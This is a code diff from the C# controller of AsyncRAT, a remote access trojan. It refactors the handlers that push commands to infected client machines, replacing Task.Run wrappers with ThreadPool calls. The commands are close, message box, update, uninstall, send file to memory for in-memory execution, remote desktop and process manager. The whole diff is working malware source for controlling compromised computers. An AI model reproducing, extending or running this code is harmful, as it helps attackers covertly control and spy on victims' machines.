@@ -137,7 +137,7 @@ namespace AsyncRAT_Sharp
             toolStripStatusLabel1.Text = $"Online {Settings.Online.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.Sent).ToString()}     Received {Methods.BytesToString(Settings.Received).ToString()}";
         }
 
-        private async void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
+        private void cLOSEToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -145,16 +145,13 @@ namespace AsyncRAT_Sharp
                 msgpack.ForcePathObject("Packet").AsString = "close";
                 foreach (ListViewItem C in listView1.SelectedItems)
                 {
-                    await Task.Run(() =>
-                    {
-                        Clients CL = (Clients)C.Tag;
-                        CL.BeginSend(msgpack.Encode2Bytes());
-                    });
+                    Clients CL = (Clients)C.Tag;
+                    ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                 }
             }
         }
 
-        private async void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
+        private void sENDMESSAGEBOXToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -168,11 +165,8 @@ namespace AsyncRAT_Sharp
                     msgpack.ForcePathObject("Message").AsString = Msgbox;
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        await Task.Run(() =>
-                        {
-                            Clients CL = (Clients)C.Tag;
-                            CL.BeginSend(msgpack.Encode2Bytes());
-                        });
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                     }
                 }
             }
@@ -194,12 +188,9 @@ namespace AsyncRAT_Sharp
                         msgpack.ForcePathObject("Update").AsString = "false";
                         foreach (ListViewItem C in listView1.SelectedItems)
                         {
-                            await Task.Run(() =>
-                            {
-                                Clients CL = (Clients)C.Tag;
-                                CL.BeginSend(msgpack.Encode2Bytes());
-                                CL.LV.ForeColor = Color.Red;
-                            });
+                            Clients CL = (Clients)C.Tag;
+                            CL.LV.ForeColor = Color.Red;
+                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -210,7 +201,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private async void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
+        private void uNISTALLToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -220,11 +211,8 @@ namespace AsyncRAT_Sharp
                     msgpack.ForcePathObject("Packet").AsString = "uninstall";
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        await Task.Run(() =>
-                        {
-                            Clients CL = (Clients)C.Tag;
-                            CL.BeginSend(msgpack.Encode2Bytes());
-                        });
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                     }
                 }
                 catch (Exception ex)
@@ -250,12 +238,9 @@ namespace AsyncRAT_Sharp
                         msgpack.ForcePathObject("Update").AsString = "true";
                         foreach (ListViewItem C in listView1.SelectedItems)
                         {
-                            await Task.Run(() =>
-                            {
-                                Clients CL = (Clients)C.Tag;
-                                CL.BeginSend(msgpack.Encode2Bytes());
-                                CL.LV.ForeColor = Color.Red;
-                            });
+                            Clients CL = (Clients)C.Tag;
+                            CL.LV.ForeColor = Color.Red;
+                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -266,7 +251,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private async void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
+        private void sENDFILETOMEMORYToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
             {
@@ -292,12 +277,9 @@ namespace AsyncRAT_Sharp
 
                         foreach (ListViewItem C in listView1.SelectedItems)
                         {
-                            await Task.Run(() =>
-                            {
-                                Clients CL = (Clients)C.Tag;
-                                CL.BeginSend(msgpack.Encode2Bytes());
-                                CL.LV.ForeColor = Color.Red;
-                            });
+                            Clients CL = (Clients)C.Tag;
+                            CL.LV.ForeColor = Color.Red;
+                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                         }
                     }
                     SF.Close();
@@ -309,7 +291,7 @@ namespace AsyncRAT_Sharp
             }
         }
 
-        private async void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
+        private void rEMOTEDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
         {
 
             if (listView1.SelectedItems.Count > 0)
@@ -321,28 +303,25 @@ namespace AsyncRAT_Sharp
                     msgpack.ForcePathObject("Option").AsString = "true";
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        await Task.Run(() =>
-                        {
-                            Clients CL = (Clients)C.Tag;
-                            CL.BeginSend(msgpack.Encode2Bytes());
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
 
-                            this.BeginInvoke((MethodInvoker)(() =>
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
+                            if (RD == null)
                             {
-                                RemoteDesktop RD = (RemoteDesktop)Application.OpenForms["RemoteDesktop:" + CL.ID];
-                                if (RD == null)
+                                RD = new RemoteDesktop
                                 {
-                                    RD = new RemoteDesktop
-                                    {
-                                        Name = "RemoteDesktop:" + CL.ID,
-                                        F = this,
-                                        Text = "RemoteDesktop:" + CL.ID,
-                                        C = CL,
-                                        Active = true
-                                    };
-                                    RD.Show();
-                                }
-                            }));
-                        });
+                                    Name = "RemoteDesktop:" + CL.ID,
+                                    F = this,
+                                    Text = "RemoteDesktop:" + CL.ID,
+                                    C = CL,
+                                    Active = true
+                                };
+                                RD.Show();
+                            }
+                        }));
                     }
                 }
                 catch (Exception ex)
@@ -353,7 +332,7 @@ namespace AsyncRAT_Sharp
 
         }
 
-        private async void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
+        private void pROCESSMANAGERToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -364,26 +343,24 @@ namespace AsyncRAT_Sharp
                     msgpack.ForcePathObject("Option").AsString = "List";
                     foreach (ListViewItem C in listView1.SelectedItems)
                     {
-                        await Task.Run(() =>
+                        Clients CL = (Clients)C.Tag;
+                        ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
+
+                        this.BeginInvoke((MethodInvoker)(() =>
                         {
-                            Clients CL = (Clients)C.Tag;
-                            CL.BeginSend(msgpack.Encode2Bytes());
-                            this.BeginInvoke((MethodInvoker)(() =>
+                            ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
+                            if (PM == null)
                             {
-                                ProcessManager PM = (ProcessManager)Application.OpenForms["processManager:" + CL.ID];
-                                if (PM == null)
+                                PM = new ProcessManager
                                 {
-                                    PM = new ProcessManager
-                                    {
-                                        Name = "processManager:" + CL.ID,
-                                        Text = "processManager:" + CL.ID,
-                                        F = this,
-                                        C = CL
-                                    };
-                                    PM.Show();
-                                }
-                            }));
-                        });
+                                    Name = "processManager:" + CL.ID,
+                                    Text = "processManager:" + CL.ID,
+                                    F = this,
+                                    C = CL
+                                };
+                                PM.Show();
+                            }
+                        }));
                     }
                 }
             }
